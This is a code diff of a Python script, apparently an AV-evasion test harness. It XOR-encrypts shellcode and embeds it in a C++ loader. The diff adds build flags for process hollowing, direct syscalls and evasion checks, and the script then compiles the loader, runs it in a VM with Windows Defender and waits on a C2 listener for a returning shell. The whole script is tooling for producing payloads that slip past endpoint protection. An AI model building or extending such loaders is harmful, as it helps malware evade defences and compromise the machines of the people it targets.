@@ -10,16 +10,16 @@ import logging
 # Cấu hình logging để xem output rõ ràng hơn
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] - %(message)s')
 
-# --- CONFIGURATION ---
+# ===================================== CONFIGURATION ==========================================
 # Cập nhật thông tin máy ảo của bạn ở đây
 VMS_CONFIG = {
     "Windows Defender": {
-        "vmx_path": r"C:\Users\Duy\Documents\Virtual_Machines\Windows_11_01.vmx", # THAY ĐỔI ĐƯỜNG DẪN NÀY
+        "vmx_path": r"C:\Users\Duy\Documents\Virtual_Machines\Windows_11_01.vmx", # Change to our VM's vmx file
         "user": "test",
         "pass": "test",
         "log_collector_host": "./log_collectors/collect_defender.ps1"
     },
-    # Thêm các máy ảo khác vào đây
+    # Add other VMs
     # "Bitdefender": {
     #     "vmx_path": r"D:\VMs\Win11_Bitdefender\Win11_Bitdefender.vmx",
     #     "user": "test",
@@ -34,12 +34,14 @@ GUEST_PAYLOAD_PATH = os.path.join(GUEST_DESKTOP, "payload.exe")
 GUEST_LOG_COLLECTOR = os.path.join(GUEST_DESKTOP, "collect_logs.ps1")
 GUEST_LOG_OUTPUT = os.path.join(GUEST_DESKTOP, "detection_log.txt")
 
-# Cấu hình C2 Listener
-LISTENER_IP = "192.168.142.1" # THAY ĐỔI BẰNG IP CỦA MÁY HOST
+# C2 Listener
+LISTENER_IP = "192.168.142.1"
 LISTENER_PORT = 4444
 
 # Biến toàn cục để listener thread cập nhật
 connection_received = False
+
+# ==================================================================================================
 
 def wait_for_vm_ready(vm_info, timeout=120):
     """
@@ -106,13 +108,10 @@ def run_command(cmd_list):
         return False
 
 def build_payload(shellcode_path, build_options):
-    """
-    Hợp nhất logic từ builder.py cũ.
-    Nhận đường dẫn shellcode và các tùy chọn, trả về đường dẫn của payload đã build.
-    """
+
     logging.info(f"Starting payload build with options: {build_options}")
     
-    # 1. Đọc shellcode
+    # 1. Get shellcode
     try:
         with open(shellcode_path, 'rb') as f:
             shellcode = f.read()
@@ -120,7 +119,7 @@ def build_payload(shellcode_path, build_options):
         logging.error(f"Shellcode file not found at {shellcode_path}")
         return None
 
-    # 2. Mã hóa (hiện tại chỉ có XOR)
+    # 2. Encryption (now only XOR)
     key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
     if build_options.get('encryption') == 'xor':
         logging.info(f"Encrypting with XOR using key: {key}")
@@ -129,7 +128,7 @@ def build_payload(shellcode_path, build_options):
     else: # none
         shellcode_to_embed = shellcode
 
-    # 3. Tạo mã nguồn C++
+    # 3. Create C++ source
     try:
         with open('src/main.cpp', 'r') as f:
             template = f.read()
@@ -137,17 +136,9 @@ def build_payload(shellcode_path, build_options):
         logging.error("Source code template 'src/main.cpp' not found.")
         return None
 
-    defines = []
-    if build_options.get('encryption') == 'xor':
-        defines.append("#define ENCRYPTION_XOR")
-    if build_options.get('injection') == 'classic':
-        defines.append("#define INJECTION_CLASSIC")
-    if build_options.get('debug'):
-        defines.append("#define DEBUG_MODE")
-
     formatted_shellcode = "{" + ", ".join([f"0x{byte:02x}" for byte in shellcode_to_embed]) + "};"
     
-    code = template.replace("/*{{DEFINES}}*/", "\n".join(defines))
+    code = template.replace("/*{{DEFINES}}*/", "")
     code = code.replace("/*{{SHELLCODE}}*/", formatted_shellcode)
     code = code.replace("/*{{SHELLCODE_LEN}}*/", str(len(shellcode_to_embed)))
     code = code.replace("/*{{KEY}}*/", f'"{key}"')
@@ -156,10 +147,32 @@ def build_payload(shellcode_path, build_options):
     with open(source_file, 'w') as f:
         f.write(code)
 
-    # 4. Biên dịch
+
+    # 4. Add build flag to Makefile
+    define_flags = []
+    if build_options.get('encryption') == 'xor':
+        define_flags.append("-DENCRYPTION_XOR")
+    if build_options.get('injection') == 'classic':
+        define_flags.append("-DINJECTION_CLASSIC")
+    elif build_options.get('injection') == 'hollowing':
+        define_flags.append("-DINJECTION_HOLLOWING")
+    if build_options.get('api_method') == 'syscalls':
+        define_flags.append("-DUSE_DIRECT_SYSCALLS")
+    elif build_options.get('api_method') == 'winapi-indirect':
+        define_flags.append("-DUSE_INDIRECT_WINAPI")
+    if build_options.get('debug'):
+        define_flags.append("-DDEBUG_MODE")
+    if build_options.get('anti_evasion'):
+        define_flags.append("-DEVASION_CHECKS_ENABLED")
+        
+    defines_str = " ".join(define_flags)
+
+
+    # 5. Compile
     output_filename = f"payload_{int(time.time())}.exe"
-    if not run_command(["make", "build", f"SRC={os.path.basename(source_file)}", f"OUT={output_filename}"]):
-        logging.error("Compilation failed. Check Makefile and MinGW setup.")
+
+    if not run_command(["make", "build", f"SRC={os.path.basename(source_file)}", f"OUT={output_filename}", f"DEFINES={defines_str}"]):
+        logging.error("Compilation failed. Check Makefile, MinGW, and NASM setup.")
         return None
     
     final_payload_path = os.path.join("output", output_filename)
@@ -200,7 +213,7 @@ def run_single_test(vm_name, payload_path, build_options):
     if not run_command(["vmrun", "revertToSnapshot", vm_info["vmx_path"], CLEAN_SNAPSHOT_NAME]): return {"status": "FAILED", "log": "Failed to revert snapshot."}
     if not run_command(["vmrun", "-T", "ws", "start", vm_info["vmx_path"], "nogui"]): return {"status": "FAILED", "log": "Failed to start VM."}
 
-    # 2. Chờ VM sẵn sàng (sẽ thêm logic kiểm tra ở đây)
+    # 2. Wait for VM ready
     logging.info("Waiting for VMware Tools to be ready (up to 120 seconds)...")
     if not wait_for_vm_ready(vm_info, timeout=120):
         run_command(["vmrun", "stop", vm_info["vmx_path"]])
@@ -233,7 +246,7 @@ def run_single_test(vm_name, payload_path, build_options):
     # 6. Wait for result from listener
     listener_thread.join()
 
-    # 7. Phân tích kết quả và Thu thập Log
+    # 7. Collect logs
     log_details = "N/A"
     result_status = "UNKNOWN"
     
@@ -250,7 +263,6 @@ def run_single_test(vm_name, payload_path, build_options):
             result_status = "FAILED (Runtime Detection?)"
             log_details = "Execution succeeded, but no shell received. Payload was likely blocked during runtime."
 
-        # TRONG MỌI TRƯỜNG HỢP THẤT BẠI, HÃY CỐ GẮNG THU THẬP LOG
         logging.info(f"Test failed ({result_status}).")
 
     logging.info("Collecting logs...")    
